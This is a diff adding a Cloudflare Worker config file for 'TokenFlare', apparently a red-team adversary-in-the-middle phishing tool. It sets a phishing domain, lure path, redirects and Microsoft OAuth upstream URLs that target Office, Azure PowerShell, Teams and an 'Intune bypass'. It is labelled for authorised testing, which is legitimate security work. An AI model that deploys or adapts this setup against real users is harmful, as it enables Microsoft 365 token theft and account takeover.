@@ -1,0 +1,71 @@
+# wrangler.toml
+# THESE CAN ALL BE CHANGED AFTER DEPLOYMENT ON CF DASHBOARD > WORKER > SETTINGS
+
+name = "tokenflare2025"
+main = "src/worker.js"     # Entry point to the Worker
+compatibility_date = "2025-12-12"  # Use today's date
+
+# Account information
+account_id = "YOUR_CF_ACCOUNT_ID_HERE"
+workers_dev = true        # Set to false if deploying to a custom domain
+
+# Don't scrub comments, as much as you can..
+minify = false
+
+# Logging
+[observability.logs]
+enabled = true
+
+# Env Variables
+[vars]
+ALLOWED_IPS = ""
+LOCAL_PHISHING_DOMAIN = ""
+# --- Alerting ---
+# Supports: Slack, Discord, Teams, or any generic webhook URL
+# WEBHOOK_URL = "https://discordapp.com/api/webhooks/YOUR_DISCORD_WEBHOOK"
+# WEBHOOK_URL = "https://webhook.site/YOUR_GENERIC_WEBHOOK_btw_webhook_site_for_testing_only"
+
+# --- Debugging ---
+DEBUGGING="true"
+
+# ---- IP Confs ---
+# Leaving this empty or unset(meaning, fallback to default) means world visitable, i.e. what you'd expect in prod
+# ALLOWED_IPS=""
+# ALLOWED_IPS="127.0.0.1"
+
+# ---- Client Settings ---
+# CLIENT_TENANT="www.client.com"
+# uncomment to set the initial login page to the client's
+CLIENT_TENANT = "common"
+# uncomment to customise where you send the user to after auth is complete
+FINAL_REDIR = "https://thecatapi.com"
+UNAUTH_REDIR = "https://labs.jumpsec.com"
+
+# ---- Lure Settings ---
+# /verifyme?uuid=<uuid>   would be the default lure path if you don't change the below
+LURE_PATH = "/verifyme"
+LURE_PARAM = "userid"
+LURE_UUID = ""
+
+# ---- Custom Signin URL & Redirection ---
+UPSTREAM_PATH = "/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&nonce=28145"
+
+# uncomment for office.com (officeHome)
+# UPSTREAM_PATH = '/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&nonce=28145'
+
+# uncomment for Azure PowerShell (foci)
+# UPSTREAM_PATH = '/common/oauth2/v2.0/authorize?client_id=1950a258-227b-4e31-a9cf-717495945fc2&redirect_uri=https%3A%2F%2Flogin.microsoftonline.com%2Fcommon%2Foauth2%2Fnativeclient&response_type=code&scope=openid+offline_access+https%3A%2F%2Fgraph.microsoft.com%2F.default'
+
+# uncomment for Teams (foci)
+# UPSTREAM_PATH = '/common/oauth2/v2.0/authorize?client_id=1fec8e78-bce4-4aaf-ab1b-5451cc387264&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&response_type=code&scope=openid+offline_access+https%3A%2F%2Fgraph.microsoft.com%2F.default'
+
+# uncomment for Intune bypass (foci)
+# UPSTREAM_PATH = '/common/oauth2/v2.0/authorize?client_id=9ba1a5c7-f17a-4de9-a1f1-6178c8d51223&redirect_uri=ms-appx-web%3A%2F%2FMicrosoft.AAD.BrokerPlugin%2FS-1-15-2-2666988183-1750391847-2906264630-3525785777-2857982319-3063633125-1907478113&response_type=code&scope=openid+offline_access+https%3A%2F%2Fgraph.microsoft.com%2F.default'
+
+# ---- Custom User Agent --
+# would fall back to proxying the user's UA if commented out
+CUSTOM_USER_AGENT='TokenFlare/1.0 For_Authorised_Testing_Only'
+# CUSTOM_USER_AGENT='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15'
+# CUSTOM_USER_AGENT='Mozilla/5.0 Cloudflare is collecting our activities as threat intel'
+
+
